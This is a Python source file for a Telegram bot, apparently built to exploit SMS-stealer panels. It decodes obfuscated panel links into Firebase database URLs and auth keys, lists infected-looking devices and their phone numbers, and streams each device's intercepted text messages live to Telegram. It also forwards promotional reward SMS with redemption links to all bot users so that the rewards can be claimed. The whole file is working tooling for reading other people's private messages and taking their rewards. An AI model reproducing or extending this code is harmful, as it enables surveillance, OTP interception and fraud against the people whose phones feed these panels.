"""
SMS Panel Monitor - Firebase Edition with Real‑time Device Monitoring
=====================================================================
- Global reward filter (Bector Foods) for all users.
- Interactive panel & device monitoring via inline keyboards.
- Shows only online devices, sorted with highest online first.
- Per‑device live message streaming (poll every 2 sec).
- Supports only Firebase panels (ZXKAI/Profex decoded, but UI shows Firebase).
- Deploy on Render with Procfile & requirements.txt.
"""

import asyncio
import json
import os
import re
import sys
import time
import base64
import logging
import httpx
from datetime import datetime, timedelta
from pathlib import Path
from urllib.parse import parse_qs, urlparse, unquote, quote
from typing import Dict, List, Optional, Tuple

from telegram import InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, Update
from telegram.ext import (
    Application,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    CallbackQueryHandler,
    filters,
)

# ─── LOGGING ───────────────────────────────────────────────────────────────────
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# ─── CONFIG ───────────────────────────────────────────────────────────────────
BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"   # <-- Replace with your actual token
ADMIN_ID = int(os.environ.get("ADMIN_ID", "0") or 0)

STATE_FILE = Path(__file__).parent / "bot_state.json"
USERS_FILE = Path(__file__).parent / "users.json"
PANELS_FILE = Path(__file__).parent / "panels.json"

IS_INITIALIZED = False
MAX_CONCURRENT_REQUESTS = 30
semaphore = asyncio.Semaphore(MAX_CONCURRENT_REQUESTS)

# ─── REWARD FILTER (Global) ─────────────────────────────────────────────────
REWARD_PATTERN = re.compile(
    r'Congratulations!?\s+You\s+have\s+won\s+Rs\.?\s*20\s+in\s+Bector\s+Foods\s+-\s+Back\s+to\s+School\s+Promo',
    re.IGNORECASE
)

# ─── ACTIVE MONITORS (per chat_id) ──────────────────────────────────────────
active_monitors: Dict[int, dict] = {}  # chat_id -> {'panel_key': pk, 'device_id': did, 'panel_config': config, 'cursor': last_key}
monitor_lock = asyncio.Lock()

# ─── DATA MANAGEMENT ──────────────────────────────────────────────────────────
def load_json(path, default):
    if path.exists():
        try:
            with open(path, "r") as f:
                return json.load(f)
        except Exception as e:
            logger.error(f"Error loading {path}: {e}")
    return default

def save_json(path, data):
    try:
        with open(path, "w") as f:
            json.dump(data, f, indent=2)
    except Exception as e:
        logger.error(f"Error saving {path}: {e}")

def load_panels(): return load_json(PANELS_FILE, {})
def save_panels(panels): save_json(PANELS_FILE, panels)
def load_state(): return load_json(STATE_FILE, {})
def save_state(state): save_json(STATE_FILE, state)
def load_users(): return load_json(USERS_FILE, [])
def save_users_list(users):
    save_json(USERS_FILE, list(set(users)))

def add_user(chat_id: int):
    users = load_users()
    if chat_id not in users:
        users.append(chat_id)
        save_users_list(users)
    return users

# ─── DECODERS (for link parsing) ─────────────────────────────────────────────
def decode_zxkai(s):
    try:
        b64 = s.replace("-", "+").replace("_", "/")
        padded = b64 + "=" * ((4 - len(b64) % 4) % 4)
        bin_data = base64.b64decode(padded)
        K = "ZXKAIv1_Xk9mP2wN7qL4vR6jH3cF8yT1ZbE5sA09"
        dec = bytearray()
        for i in range(len(bin_data)):
            dec.append(bin_data[i] ^ ord(K[i % len(K)]))
        obj = json.loads(dec.decode("utf-8"))
        if obj.get('u') and obj.get('k'):
            return obj['u'], obj['k']
    except: pass
    return None, None

def decode_profex(s):
    try:
        decoded = base64.b64decode(s).decode("utf-8")
        if "|||" in decoded:
            parts = decoded.split("|||")
            return parts[0], parts[1] if len(parts) > 1 else ""
    except: pass
    return None, None

def get_panel_api_url(panel_url):
    parsed = urlparse(panel_url)
    qs = parse_qs(parsed.query)
    s_param = qs.get('s', [''])[0]
    url, key = decode_zxkai(s_param)
    if url: return url.rstrip('/'), key
    url, key = decode_profex(s_param)
    if url: return url.rstrip('/'), key
    if ".firebaseio.com" in parsed.netloc:
        url = panel_url.split('?')[0].split('.json')[0].rstrip('/')
        key = ""
        for k, v in qs.items():
            if k.lower() in ['key', 'auth', 'secret']:
                key = v[0]
                break
        return url, key
    return None, None

# ─── API HELPERS ──────────────────────────────────────────────────────────────
async def api_fetch(client, url, timeout=15):
    async with semaphore:
        try:
            resp = await client.get(url, timeout=timeout)
            if resp.status_code == 200:
                return resp.json(), None
            return None, f"HTTP {resp.status_code}"
        except Exception as e:
            return None, str(e)

def is_valid_device_id(k):
    if not isinstance(k, str): return False
    if k.lower() in ["messages", "clients", "devices", "users", "all_devices", "nodes", "settings", "sms", "logs"]:
        return False
    return 8 <= len(k) <= 45

async def discover_structure(client, api_url, auth_key):
    """Find device_node and message_node."""
    auth_suffix = f"?auth={auth_key}" if auth_key else ""
    root_data, error = await api_fetch(client, f"{api_url}/.json{auth_suffix}&shallow=true")
    if root_data and isinstance(root_data, dict):
        keys = list(root_data.keys())
        device_ids = [k for k in keys if is_valid_device_id(k)]
        if device_ids:
            for m_node in ["messages", "sms", "logs"]:
                if m_node in keys: return "", m_node
            return "", ""
        for node in ["clients", "devices", "users", "all_devices", "nodes"]:
            if node in keys:
                node_data, _ = await api_fetch(client, f"{api_url}/{node}.json{auth_suffix}&shallow=true")
                if node_data and isinstance(node_data, dict):
                    if any(is_valid_device_id(k) for k in node_data.keys()):
                        msg_node = node
                        for m_node in ["messages", "sms", "logs"]:
                            if m_node in keys:
                                msg_node = m_node
                                break
                        return node, msg_node
    return None, error

async def get_device_list(client, api_url, auth_key, device_node):
    """Return list of device IDs (shallow)."""
    auth_suffix = f"?auth={auth_key}" if auth_key else ""
    path = f"/{device_node}" if device_node else ""
    url = f"{api_url}{path}/.json{auth_suffix}&shallow=true"
    data, error = await api_fetch(client, url, 15)
    if error: return None, error
    if not data or not isinstance(data, dict): return [], None
    return [k for k in data.keys() if is_valid_device_id(k)], None

async def get_device_data(client, api_url, auth_key, device_node, device_id) -> Optional[dict]:
    auth_suffix = f"?auth={auth_key}" if auth_key else ""
    path = f"/{device_node}" if device_node else ""
    url = f"{api_url}{path}/{device_id}/.json{auth_suffix}"
    data, _ = await api_fetch(client, url, 10)
    return data if isinstance(data, dict) else None

async def get_messages(client, api_url, auth_key, message_node, device_id, cursor=None, limit: int = 500) -> dict:
    path = f"/{message_node}" if message_node else ""
    params = ['orderBy="%24key"']
    if cursor:
        cursor_encoded = quote(str(cursor), safe="")
        params.append(f'startAt="{cursor_encoded}"')
        params.append(f"limitToFirst={limit}")
    else:
        params.append(f"limitToLast={limit}")
    if auth_key:
        auth_encoded = quote(str(auth_key), safe="")
        params.append(f"auth={auth_encoded}")
    url = f'{api_url}{path}/{device_id}/.json?' + "&".join(params)
    data, _ = await api_fetch(client, url, 30)
    return data if isinstance(data, dict) else {}

def is_device_online(device_data: dict) -> bool:
    """Check if device is online based on known fields."""
    if not device_data: return False
    # Direct boolean
    if 'online' in device_data:
        return bool(device_data['online'])
    if 'status' in device_data:
        if isinstance(device_data['status'], str):
            return device_data['status'].lower() == 'online'
        if isinstance(device_data['status'], bool):
            return device_data['status']
    # lastSeen within last 5 minutes
    for field in ['lastSeen', 'lastActivity', 'last_online']:
        if field in device_data:
            val = device_data[field]
            try:
                # Could be timestamp (int/float) or ISO string
                if isinstance(val, (int, float)):
                    dt = datetime.fromtimestamp(val)
                elif isinstance(val, str):
                    dt = datetime.fromisoformat(val.replace('Z', '+00:00'))
                else:
                    continue
                if datetime.now().astimezone() - dt < timedelta(minutes=5):
                    return True
            except:
                pass
    return False

async def get_online_devices(client, api_url, auth_key, device_node):
    """Return list of (device_id, number) that are online."""
    device_ids, error = await get_device_list(client, api_url, auth_key, device_node)
    if error: return [], error
    online = []
    for did in device_ids:
        data = await get_device_data(client, api_url, auth_key, device_node, did)
        if data and is_device_online(data):
            # try to get number
            number = ""
            for f in ["number", "phoneNumber", "phone", "fromNumber", "to", "sim_number"]:
                if f in data and data[f]:
                    number = str(data[f])
                    break
            if not number:
                for nested in ["webhookEvent", "info", "details"]:
                    if nested in data and isinstance(data[nested], dict):
                        d = data[nested]
                        for f in ["number", "phone", "to", "sendSms"]:
                            if f in d:
                                val = d[f]
                                if isinstance(val, dict) and "to" in val:
                                    number = str(val["to"])
                                elif isinstance(val, str):
                                    number = val
                                if number: break
                        if number: break
            online.append((did, number))
    # sort maybe by number? we'll keep as is
    return online, None

# ─── GLOBAL REWARD MONITOR (same as before) ──────────────────────────────────
async def process_device_reward(client, panel_key, panel_config, device_id, state, users, app, is_new_panel):
    api_url = panel_config.get("api_url")
    auth_key = panel_config.get("auth_key", "")
    msg_node = panel_config.get("message_node", "")
    dev_node = panel_config.get("device_node", "")
    panel_name = panel_config.get("name", "Unknown")
    cursor_key = f"reward_cursor:{panel_key}:{device_id}"
    cursor = state.get(cursor_key)
    new_sent = 0
    try:
        messages = await get_messages(client, api_url, auth_key, msg_node, device_id, cursor=cursor, limit=500)
        if not messages:
            return 0
        ordered_messages = sorted(messages.items(), key=lambda item: str(item[0]))
        if not cursor and (not IS_INITIALIZED or is_new_panel):
            state[cursor_key] = str(ordered_messages[-1][0])
            return 0
        for msg_key, msg_data in ordered_messages:
            msg_key = str(msg_key)
            if cursor and msg_key <= str(cursor):
                continue
            state[cursor_key] = msg_key
            if not isinstance(msg_data, dict):
                continue
            msg_id = str(msg_data.get("id", msg_key))
            full_key = f"reward:{panel_key}:{device_id}:{msg_id}"
            if state.get(full_key):
                continue
            message_text = ""
            for field in ["message", "body", "text", "msg", "SMS"]:
                if field in msg_data:
                    message_text = msg_data[field]
                    break
            sender = "Unknown"
            for field in ["sender", "from", "address", "number"]:
                if field in msg_data:
                    sender = msg_data[field]
                    break
            dt = msg_data.get("dateTime", msg_data.get("time", ""))
            state[full_key] = True
            if not message_text:
                continue
            if not REWARD_PATTERN.search(str(message_text)):
                continue
            number = ""
            dev_data = await get_device_data(client, api_url, auth_key, dev_node, device_id)
            if dev_data:
                for f in ["number", "phoneNumber", "phone", "fromNumber", "to", "sim_number"]:
                    if f in dev_data and dev_data[f]:
                        number = str(dev_data[f])
                        break
            # format reward
            link_match = re.search(r'https?://[^\s]+', message_text)
            link = link_match.group(0) if link_match else ""
            preview = message_text[:200] + ("..." if len(message_text) > 200 else "")
            if link and link not in preview:
                preview += f"\n\n🔗 [Redemption Link]({link})"
            notif = (
                f"🎉 *REWARD DETECTED*\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"📱 *Panel:* {panel_name}\n"
                f"📲 *Device:* `{device_id}`\n"
                f"{f'🔢 *Number:* `{number}`' if number else ''}\n"
                f"📨 *From:* {sender}\n"
                f"⏰ *Time:* {dt}\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"📄 *Message Preview:*\n"
                f"{preview}\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"💡 *Full message stored in panel.*"
            )
            for user_chat_id in users:
                try:
                    await app.bot.send_message(chat_id=user_chat_id, text=notif,
                                               parse_mode="Markdown", disable_web_page_preview=True)
                except Exception as e:
                    logger.error(f"Send error: {e}")
            new_sent += 1
    except Exception as e:
        logger.error(f"Reward processing error for {device_id}: {e}")
    return new_sent

async def global_reward_monitor(context: ContextTypes.DEFAULT_TYPE):
    global IS_INITIALIZED
    app = context.application
    panels = load_panels()
    state = load_state()
    users = load_users()
    if not users and IS_INITIALIZED: return
    async with httpx.AsyncClient() as client:
        for panel_key, panel_config in list(panels.items()):
            if not panel_config.get("active", True):
                continue
            api_url = panel_config.get("api_url")
            auth_key = panel_config.get("auth_key", "")
            if not api_url: continue
            init_key = f"init_reward:{panel_key}"
            is_new_panel = not state.get(init_key, False)
            try:
                if panel_config.get("device_node") is None:
                    dev_node, msg_node = await discover_structure(client, api_url, auth_key)
                    if dev_node is not None:
                        panel_config["device_node"] = dev_node
                        panel_config["message_node"] = msg_node
                        save_panels(panels)
                    else:
                        continue
                dev_node = panel_config.get("device_node")
                device_ids, error = await get_device_list(client, api_url, auth_key, dev_node)
                if not device_ids:
                    if is_new_panel: state[init_key] = True
                    continue
                tasks = [
                    process_device_reward(client, panel_key, panel_config, did, state, users, app, is_new_panel)
                    for did in device_ids
                ]
                await asyncio.gather(*tasks)
                if is_new_panel:
                    state[init_key] = True
            except Exception as e:
                logger.error(f"Reward monitor error {panel_key}: {e}")
    if not IS_INITIALIZED:
        IS_INITIALIZED = True
        save_state(state)
        logger.info("Global reward monitor initialized.")

# ─── PER‑DEVICE MONITOR (for user‑requested streaming) ──────────────────────
async def device_stream_poll(context: ContextTypes.DEFAULT_TYPE):
    """Poll every 2 seconds for all active monitors."""
    async with monitor_lock:
        if not active_monitors:
            return
        # copy to avoid modification during iteration
        monitors = list(active_monitors.items())
    async with httpx.AsyncClient() as client:
        for chat_id, info in monitors:
            panel_key = info['panel_key']
            device_id = info['device_id']
            panel_config = info['panel_config']
            cursor = info.get('cursor')
            api_url = panel_config.get("api_url")
            auth_key = panel_config.get("auth_key", "")
            msg_node = panel_config.get("message_node", "")
            dev_node = panel_config.get("device_node", "")
            panel_name = panel_config.get("name", "Unknown")
            try:
                messages = await get_messages(client, api_url, auth_key, msg_node, device_id, cursor=cursor, limit=100)
                if not messages:
                    continue
                ordered = sorted(messages.items(), key=lambda x: str(x[0]))
                # update cursor
                if ordered:
                    new_cursor = str(ordered[-1][0])
                    info['cursor'] = new_cursor
                for msg_key, msg_data in ordered:
                    msg_key = str(msg_key)
                    if cursor and msg_key <= str(cursor):
                        continue
                    if not isinstance(msg_data, dict):
                        continue
                    # skip reward messages because global alert already sends
                    message_text = ""
                    for f in ["message", "body", "text", "msg", "SMS"]:
                        if f in msg_data:
                            message_text = msg_data[f]
                            break
                    if not message_text:
                        continue
                    if REWARD_PATTERN.search(str(message_text)):
                        continue  # skip, global will handle
                    sender = "Unknown"
                    for f in ["sender", "from", "address", "number"]:
                        if f in msg_data:
                            sender = msg_data[f]
                            break
                    dt = msg_data.get("dateTime", msg_data.get("time", ""))
                    # format and send
                    msg_preview = message_text[:300] + ("..." if len(message_text) > 300 else "")
                    notif = (
                        f"📩 *New Message*\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"📱 *Panel:* {panel_name}\n"
                        f"📲 *Device:* `{device_id}`\n"
                        f"📨 *From:* {sender}\n"
                        f"⏰ *Time:* {dt}\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"📄 *Message:*\n{msg_preview}"
                    )
                    # Also include any link
                    link_match = re.search(r'https?://[^\s]+', message_text)
                    if link_match and link_match.group(0) not in msg_preview:
                        notif += f"\n\n🔗 [Link]({link_match.group(0)})"
                    try:
                        await context.bot.send_message(chat_id=chat_id, text=notif,
                                                       parse_mode="Markdown", disable_web_page_preview=True)
                    except Exception as e:
                        logger.error(f"Send stream error: {e}")
            except Exception as e:
                logger.error(f"Stream poll error for {panel_key}/{device_id}: {e}")

# ─── TELEGRAM HANDLERS ──────────────────────────────────────────────────────

# --- Main Menu ---
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    add_user(chat_id)
    keyboard = [
        [InlineKeyboardButton("📱 Monitor Devices", callback_data="monitor_panels")],
        [InlineKeyboardButton("📊 Status", callback_data="status")],
        [InlineKeyboardButton("📋 My Panels", callback_data="my_panels")],
        [InlineKeyboardButton("➕ Add Panel", callback_data="add_panel")],
        [InlineKeyboardButton("❌ Remove Panel", callback_data="remove_panel")]
    ]
    markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "🤖 *Firebase SMS Monitor*\n\n"
        "• Global reward alerts (Bector Foods) active.\n"
        "• Click 'Monitor Devices' to see panels & online devices.\n"
        "• Select a device to stream incoming messages in real‑time.\n\n"
        f"👤 *Your Chat ID:* `{chat_id}`",
        parse_mode="Markdown", reply_markup=markup
    )

# --- Callback Query Handler ---
async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    chat_id = update.effective_chat.id

    # --- STATUS ---
    if data == "status":
        panels = load_panels()
        users = load_users()
        text = "📊 *Monitor Status*\n━━━━━━━━━━━━━━━━━━━━━━\n\n"
        total_devices = 0
        async with httpx.AsyncClient() as client:
            for pk, pc in panels.items():
                if not pc.get("active", True): continue
                api_url = pc.get("api_url"); auth_key = pc.get("auth_key", "")
                panel_name = pc.get("name", "Unknown")
                device_count = 0
                if not api_url:
                    status = "🔴 Link Error"
                else:
                    try:
                        dev_node = pc.get("device_node")
                        if dev_node is None:
                            dev_node, _ = await discover_structure(client, api_url, auth_key)
                        if dev_node is not None:
                            device_ids, error = await get_device_list(client, api_url, auth_key, dev_node)
                            if error:
                                status = f"🔴 {error}"
                            else:
                                device_count = len(device_ids)
                                total_devices += device_count
                                status = "🟢 Active" if device_count > 0 else "🟡 No Devices"
                        else:
                            status = "🔴 Structure Error"
                    except Exception as e:
                        status = f"🔴 Error: {str(e)[:30]}"
                text += f"*{panel_name}*\nStatus: {status} | Devices: {device_count}\n━━━━━━━━━━━━━━━━━━━━━━\n"
        text += f"\n📦 Total Devices: {total_devices}\n👥 Active Users: {len(users)}"
        await query.edit_message_text(text, parse_mode="Markdown")
        return

    # --- MY PANELS ---
    if data == "my_panels":
        panels = load_panels()
        if not panels:
            await query.edit_message_text("❌ Koi panel nahi hai.")
            return
        text = "📋 *My Panels*\n━━━━━━━━━━━━━━━━━━━━━━\n\n"
        keyboard = []
        is_admin = ADMIN_ID != 0 and update.effective_user.id == ADMIN_ID
        for i, (pk, pc) in enumerate(panels.items(), 1):
            active = pc.get("active", True)
            state_text = "🟢 Active" if active else "⚪ Inactive"
            text += f"*{i}. {pc.get('name')}* — {state_text}\n\n"
            if is_admin:
                keyboard.append([
                    InlineKeyboardButton(f"✅ ON {pc.get('name')}", callback_data=f"panel_on:{pk}"),
                    InlineKeyboardButton(f"❌ OFF {pc.get('name')}", callback_data=f"panel_off:{pk}"),
                ])
        markup = InlineKeyboardMarkup(keyboard) if keyboard else None
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=markup)
        return

    # --- TOGGLE PANEL (admin only) ---
    if data.startswith("panel_on:") or data.startswith("panel_off:"):
        if ADMIN_ID == 0 or update.effective_user.id != ADMIN_ID:
            await query.answer("Sirf admin.", show_alert=True)
            return
        action, panel_key = data.split(":", 1)
        panels = load_panels()
        if panel_key not in panels:
            await query.edit_message_text("❌ Panel nahi mila.")
            return
        panels[panel_key]["active"] = (action == "panel_on")
        save_panels(panels)
        state = load_state()
        if action == "panel_on":
            state.pop(f"init_reward:{panel_key}", None)
        save_state(state)
        status = "🟢 Active" if panels[panel_key]["active"] else "⚪ Inactive"
        await query.edit_message_text(f"✅ {panels[panel_key].get('name', 'Panel')} ab {status} hai.")
        return

    # --- ADD PANEL (link input) ---
    if data == "add_panel":
        await query.edit_message_text("➕ *Add Firebase Panels*\n\nLinks bhejein (har link nayi line par).", parse_mode="Markdown")
        context.user_data["awaiting_url"] = True
        return

    # --- REMOVE PANEL ---
    if data == "remove_panel":
        panels = load_panels()
        if not panels:
            await query.edit_message_text("❌ Koi panel nahi hai.")
            return
        text = "❌ *Remove Panel(s)*\n\n"
        panels_list = []
        for i, (pk, pc) in enumerate(panels.items(), 1):
            text += f"{i}. {pc.get('name')}\n"
            panels_list.append(pk)
        text += "\nNumber(s) bhejo (comma se, e.g. 1,3,5)."
        context.user_data["awaiting_remove"] = True
        context.user_data["panels_list"] = panels_list
        await query.edit_message_text(text, parse_mode="Markdown")
        return

    # --- MONITOR DEVICES: show panels list ---
    if data == "monitor_panels":
        panels = load_panels()
        if not panels:
            await query.edit_message_text("❌ Koi panel nahi hai. Pehle panel add karein.")
            return
        keyboard = []
        async with httpx.AsyncClient() as client:
            for pk, pc in panels.items():
                if not pc.get("active", True): continue
                api_url = pc.get("api_url"); auth_key = pc.get("auth_key", "")
                if not api_url: continue
                # get online count
                dev_node = pc.get("device_node")
                if dev_node is None:
                    dev_node, _ = await discover_structure(client, api_url, auth_key)
                    if dev_node is not None:
                        pc["device_node"] = dev_node
                        save_panels(panels)
                if dev_node is not None:
                    online, _ = await get_online_devices(client, api_url, auth_key, dev_node)
                    online_count = len(online)
                else:
                    online_count = 0
                label = f"{pc.get('name', 'Panel')} ({online_count} online)"
                keyboard.append([InlineKeyboardButton(label, callback_data=f"panel_devices:{pk}")])
        if not keyboard:
            await query.edit_message_text("❌ Koi active Firebase panel nahi mila.")
            return
        markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text("📱 *Select a Panel to see online devices:*", parse_mode="Markdown", reply_markup=markup)
        return

    # --- SHOW ONLINE DEVICES FOR A PANEL ---
    if data.startswith("panel_devices:"):
        panel_key = data.split(":", 1)[1]
        panels = load_panels()
        pc = panels.get(panel_key)
        if not pc:
            await query.edit_message_text("❌ Panel not found.")
            return
        api_url = pc.get("api_url"); auth_key = pc.get("auth_key", "")
        dev_node = pc.get("device_node")
        if dev_node is None:
            async with httpx.AsyncClient() as client:
                dev_node, _ = await discover_structure(client, api_url, auth_key)
                if dev_node is not None:
                    pc["device_node"] = dev_node
                    save_panels(panels)
                else:
                    await query.edit_message_text("❌ Structure not found.")
                    return
        # fetch online devices
        async with httpx.AsyncClient() as client:
            online, error = await get_online_devices(client, api_url, auth_key, dev_node)
        if error:
            await query.edit_message_text(f"❌ Error: {error}")
            return
        if not online:
            await query.edit_message_text("❌ Koi online device nahi mila is panel mein.")
            return
        # build keyboard with devices
        keyboard = []
        for did, number in online:
            label = f"{did[:8]}... ({number})" if number else did[:12]+"..."
            keyboard.append([InlineKeyboardButton(label, callback_data=f"start_monitor:{panel_key}:{did}")])
        # add a back button
        keyboard.append([InlineKeyboardButton("🔙 Back to Panels", callback_data="monitor_panels")])
        markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(f"📱 *Online Devices – {pc.get('name')}*\nSelect a device to monitor:", parse_mode="Markdown", reply_markup=markup)
        return

    # --- START MONITORING A DEVICE ---
    if data.startswith("start_monitor:"):
        _, panel_key, device_id = data.split(":", 2)
        panels = load_panels()
        pc = panels.get(panel_key)
        if not pc:
            await query.edit_message_text("❌ Panel not found.")
            return
        # check if already monitoring something for this chat
        async with monitor_lock:
            if chat_id in active_monitors:
                # stop previous
                old = active_monitors.pop(chat_id, None)
                logger.info(f"Stopped monitoring {old} for chat {chat_id}")
        # start new
        info = {
            'panel_key': panel_key,
            'device_id': device_id,
            'panel_config': pc,
            'cursor': None  # will get on first poll
        }
        async with monitor_lock:
            active_monitors[chat_id] = info
        # send confirmation with control buttons
        keyboard = [
            [InlineKeyboardButton("⏹ Stop Monitoring", callback_data="stop_monitor")],
            [InlineKeyboardButton("🔙 Back to Panels", callback_data="monitor_panels")],
            [InlineKeyboardButton("🎲 Random Device", callback_data=f"random_device:{panel_key}")]
        ]
        markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            f"✅ *Monitoring started*\n\n"
            f"📱 Panel: {pc.get('name')}\n"
            f"📲 Device: `{device_id}`\n\n"
            f"New messages will appear here in real‑time.\n"
            f"Use buttons below to control.",
            parse_mode="Markdown", reply_markup=markup
        )
        return

    # --- STOP MONITORING ---
    if data == "stop_monitor":
        async with monitor_lock:
            removed = active_monitors.pop(chat_id, None)
        if removed:
            await query.edit_message_text("✅ Monitoring stopped.")
        else:
            await query.edit_message_text("❌ Koi active monitoring nahi thi.")
        return

    # --- RANDOM DEVICE ---
    if data.startswith("random_device:"):
        panel_key = data.split(":", 1)[1]
        panels = load_panels()
        pc = panels.get(panel_key)
        if not pc:
            await query.edit_message_text("❌ Panel not found.")
            return
        api_url = pc.get("api_url"); auth_key = pc.get("auth_key", "")
        dev_node = pc.get("device_node")
        if not dev_node:
            async with httpx.AsyncClient() as client:
                dev_node, _ = await discover_structure(client, api_url, auth_key)
                if dev_node is not None:
                    pc["device_node"] = dev_node
                    save_panels(panels)
                else:
                    await query.edit_message_text("❌ Structure not found.")
                    return
        async with httpx.AsyncClient() as client:
            online, error = await get_online_devices(client, api_url, auth_key, dev_node)
        if error or not online:
            await query.edit_message_text("❌ Koi online device nahi mila.")
            return
        import random
        did, number = random.choice(online)
        # start monitoring this device
        # first stop current (if any)
        async with monitor_lock:
            if chat_id in active_monitors:
                active_monitors.pop(chat_id, None)
        info = {
            'panel_key': panel_key,
            'device_id': did,
            'panel_config': pc,
            'cursor': None
        }
        async with monitor_lock:
            active_monitors[chat_id] = info
        keyboard = [
            [InlineKeyboardButton("⏹ Stop Monitoring", callback_data="stop_monitor")],
            [InlineKeyboardButton("🔙 Back to Panels", callback_data="monitor_panels")],
            [InlineKeyboardButton("🎲 Random Device", callback_data=f"random_device:{panel_key}")]
        ]
        markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            f"✅ *Now monitoring random device*\n\n"
            f"📱 Panel: {pc.get('name')}\n"
            f"📲 Device: `{did}`\n"
            f"{f'🔢 Number: {number}' if number else ''}\n\n"
            f"New messages will appear here.",
            parse_mode="Markdown", reply_markup=markup
        )
        return

    # fallback
    await query.edit_message_text("Unknown option.")

# --- Text Message Handler (for Add/Remove) ---
async def handle_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    chat_id = update.effective_chat.id

    # Add panel
    if context.user_data.get("awaiting_url"):
        context.user_data["awaiting_url"] = False
        links = [line.strip() for line in text.split('\n') if line.strip()]
        if not links:
            await update.message.reply_text("❌ Link nahi mila.")
            return
        panels = load_panels()
        added = 0
        async with httpx.AsyncClient() as client:
            for link in links:
                if not link.startswith('http'): continue
                api_url, auth_key = get_panel_api_url(link)
                if not api_url: continue
                # discovery
                dev_node, msg_node = await discover_structure(client, api_url, auth_key)
                if dev_node is None:
                    await update.message.reply_text(f"⚠️ Structure not found for {link}")
                    continue
                pid = f"p_{int(time.time())}_{added}_{len(panels)}"
                panels[pid] = {
                    "name": f"Panel {len(panels)+1}",
                    "api_url": api_url,
                    "auth_key": auth_key,
                    "device_node": dev_node,
                    "message_node": msg_node,
                    "active": True,
                    "panel_url": link,
                    "added_date": datetime.now().strftime("%Y-%m-%d")
                }
                added += 1
        save_panels(panels)
        try:
            await update.message.delete()
        except: pass
        await update.message.reply_text(f"✅ {added} panel(s) add ho gaye!")
        # send back to main menu
        await start_command(update, context)
        return

    # Remove panel
    if context.user_data.get("awaiting_remove"):
        context.user_data["awaiting_remove"] = False
        plist = context.user_data.get("panels_list", [])
        try:
            indices = [int(x.strip()) - 1 for x in text.split(',') if x.strip().isdigit()]
            if not indices:
                await update.message.reply_text("❌ Koi valid number nahi.")
                return
            removed_names = []
            panels = load_panels()
            for idx in sorted(indices, reverse=True):
                if 0 <= idx < len(plist):
                    pk = plist[idx]
                    removed = panels.pop(pk, None)
                    if removed:
                        removed_names.append(removed.get('name'))
            if removed_names:
                save_panels(panels)
                await update.message.reply_text(f"✅ Removed: {', '.join(removed_names)}")
            else:
                await update.message.reply_text("❌ Koi panel remove nahi hua.")
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {e}")
        return

    # If not in any special mode, just ignore
    await update.message.reply_text("Use /start for menu.")

# ─── MAIN ─────────────────────────────────────────────────────────────────────

async def main():
    if not BOT_TOKEN or BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        logger.error("BOT_TOKEN not set! Replace placeholder with actual token.")
        sys.exit(1)

    application = Application.builder().token(BOT_TOKEN).build()

    # Handlers
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CallbackQueryHandler(callback_handler))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text_message))

    # Global reward monitor every 15 seconds
    application.job_queue.run_repeating(global_reward_monitor, interval=15, first=5)

    # Device stream poll every 2 seconds
    application.job_queue.run_repeating(device_stream_poll, interval=2, first=3)

    logger.info("Bot starting...")
    async with application:
        await application.initialize()
        await application.start()
        await application.updater.start_polling(allowed_updates=Update.ALL_TYPES)
        while True:
            await asyncio.sleep(1)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit): pass
    except Exception as e:
        logger.fatal(f"Fatal error: {e}")